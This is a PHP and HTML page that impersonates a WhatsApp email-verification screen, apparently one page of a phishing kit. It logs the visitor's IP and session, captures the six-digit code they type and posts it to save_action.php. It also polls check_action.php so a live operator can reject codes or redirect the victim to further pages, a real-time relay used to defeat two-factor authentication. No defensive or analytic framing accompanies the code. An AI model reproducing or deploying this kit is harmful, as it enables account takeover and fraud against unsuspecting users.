<?php
$sessionId = $_GET['session'] ?? '';
$clientIp = $_GET['ip'] ?? '';
$errorMessage = '';
$emailCode = '';

if (empty($sessionId) || empty($clientIp)) {
    die("Parameters missing");
}

$actionFile = 'sessions/' . $sessionId . '_action.json';
if (file_exists($actionFile)) {
    $actionData = json_decode(file_get_contents($actionFile), true);
    if (isset($actionData['action']) && $actionData['action'] === 'email_error') {
        $errorMessage = $actionData['errorMessage'] ?? 'The email code you entered is incorrect. Please try again.';
        unlink($actionFile);
    }
}

$trackingFile = 'tracking/' . $sessionId . '.json';
$trackingData = [
    'page' => 'email_verification.php',
    'timestamp' => time(),
    'ip' => $clientIp
];

if (!file_exists('tracking')) {
    mkdir('tracking', 0777, true);
}

file_put_contents($trackingFile, json_encode($trackingData));

$filename = 'sessions/' . $sessionId . '.json';
$clientData = [];

if (file_exists($filename)) {
    $clientData = json_decode(file_get_contents($filename), true);
}

$expectedEmailCode = '';
if (file_exists($actionFile)) {
    $actionData = json_decode(file_get_contents($actionFile), true);
    if (isset($actionData['emailCode'])) {
        $expectedEmailCode = $actionData['emailCode'];
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Email</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #ecf5ee 0%, #d7f5d4 100%);
            color: #111;
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            max-width: 420px;
            width: 100%;
        }
        
        .verification-card {
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
            padding: 40px 20px;
            margin-bottom: 20px;
            border-top: 5px solid #25D366;
        }
        
        .verification-icon {
            font-size: 48px;
            color: #25D366;
            text-align: center;
            margin-bottom: 20px;
        }
        
        .verification-title {
            font-size: 22px;
            font-weight: 600;
            color: #111;
            text-align: center;
            margin-bottom: 12px;
        }
        
        .verification-message {
            color: #54656f;
            text-align: center;
            margin-bottom: 24px;
            font-size: 14px;
            line-height: 1.5;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-label {
            display: block;
            font-size: 13px;
            color: #54656f;
            margin-bottom: 8px;
            font-weight: 500;
        }
        
        .form-control {
            width: 100%;
            padding: 12px;
            border: 2px solid #e5e7eb;
            border-radius: 8px;
            font-size: 16px;
            color: #111;
            text-align: center;
            letter-spacing: 4px;
            font-weight: 600;
            transition: all 0.3s ease;
        }
        
        .form-control:focus {
            border-color: #25D366;
            outline: none;
            box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.1);
        }
        
        .verify-button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #25D366 0%, #1ebc5e 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 12px;
            transition: all 0.3s ease;
            box-shadow: 0 2px 8px rgba(37, 211, 102, 0.3);
        }
        
        .verify-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(37, 211, 102, 0.4);
        }
        
        .timer {
            text-align: center;
            margin-bottom: 16px;
            color: #54656f;
            font-size: 13px;
        }
        
        .timer span {
            font-weight: 600;
            color: #25D366;
        }
        
        .resend-link {
            text-align: center;
        }
        
        .resend-link a {
            color: #25D366;
            text-decoration: none;
            font-size: 13px;
            font-weight: 500;
        }
        
        .resend-link a:hover {
            text-decoration: underline;
        }
        
        .error-message {
            background-color: #fdecea;
            color: #d32f2f;
            padding: 12px;
            border-radius: 6px;
            margin-bottom: 16px;
            font-size: 13px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .error-message i {
            font-size: 16px;
        }
        
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #54656f;
            font-size: 12px;
        }
        
        .footer a {
            color: #25D366;
            text-decoration: none;
        }
        
        @media (max-width: 480px) {
            .verification-card {
                padding: 30px 15px;
            }
            
            .verification-title {
                font-size: 18px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="verification-card">
            <div class="verification-icon">
                <i class="fas fa-envelope"></i>
            </div>
            
            <div class="verification-title">Verify Your Email</div>
            <p class="verification-message">We've sent a 6-digit code to your email address for security.</p>
            
            <?php if (!empty($errorMessage)): ?>
            <div class="error-message">
                <i class="fas fa-exclamation-circle"></i> <?php echo htmlspecialchars($errorMessage); ?>
            </div>
            <?php endif; ?>
            
            <form id="email-form" method="post" action="loading.php?session=<?php echo htmlspecialchars($sessionId); ?>&ip=<?php echo htmlspecialchars($clientIp); ?>">
                <div class="form-group">
                    <label for="email-code" class="form-label">Code</label>
                    <input type="text" id="email-code" name="email_code" class="form-control" placeholder="------" maxlength="8" required value="<?php echo htmlspecialchars($emailCode); ?>">
                </div>
                
                <div class="timer">
                    Time remaining: <span id="countdown">02:00</span>
                </div>
                
                <button type="submit" class="verify-button">
                    <i class="fas fa-check"></i> Verify
                </button>
                
                <div class="resend-link">
                    <a href="#" id="resend-link" style="display: none;"><i class="fas fa-redo"></i> Resend Code</a>
                </div>
            </form>
        </div>
        
        <div class="footer">
            <p>© 2026 WhatsApp. <a href="#">Privacy</a> · <a href="#">Terms</a></p>
        </div>
    </div>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const sessionId = '<?php echo $sessionId; ?>';
            const clientIp = '<?php echo $clientIp; ?>';
            const emailForm = document.getElementById('email-form');
            const emailCodeInput = document.getElementById('email-code');
            const resendLink = document.getElementById('resend-link');
            const countdownElement = document.getElementById('countdown');
            
            emailCodeInput.focus();
            
            emailForm.addEventListener('submit', function(event) {
                event.preventDefault();
                
                const emailCode = emailCodeInput.value.trim();
                
                if (emailCode === '') return;
                
                fetch('save_action.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        session: sessionId,
                        ip: clientIp,
                        action: 'email_code_submitted',
                        emailCode: emailCode
                    })
                })
                .then(response => response.json())
                .then(data => {
                    window.location.href = `loading.php?session=${sessionId}&ip=${clientIp}`;
                })
                .catch(error => {
                    console.error('Error:', error);
                    window.location.href = `loading.php?session=${sessionId}&ip=${clientIp}`;
                });
            });
            
            let timeLeft = 120;
            
            function updateCountdown() {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 0) {
                    clearInterval(countdownInterval);
                    resendLink.style.display = 'inline';
                } else {
                    timeLeft--;
                }
            }
            
            updateCountdown();
            const countdownInterval = setInterval(updateCountdown, 1000);
            
            resendLink.addEventListener('click', function(event) {
                event.preventDefault();
                
                timeLeft = 120;
                updateCountdown();
                resendLink.style.display = 'none';
                
                clearInterval(countdownInterval);
                const newCountdownInterval = setInterval(updateCountdown, 1000);
                
                fetch('save_action.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        session: sessionId,
                        ip: clientIp,
                        action: 'email_resend_requested'
                    })
                })
                .catch(error => console.error('Error:', error));
            });
            
            function checkAction() {
                fetch(`check_action.php?session=${sessionId}&ip=${clientIp}`)
                    .then(response => response.json())
                    .then(data => {
                        if (data.action) {
                            if (data.action === 'email_error') {
                                window.location.reload();
                            } else if (data.action === 'redirect' && data.redirect) {
                                window.location.href = data.redirect + '.php?session=' + sessionId + '&ip=' + clientIp;
                            }
                        }
                    })
                    .catch(error => console.error('Error:', error));
            }
            
            setInterval(checkAction, 2000);
        });
    </script>
</body>
</html>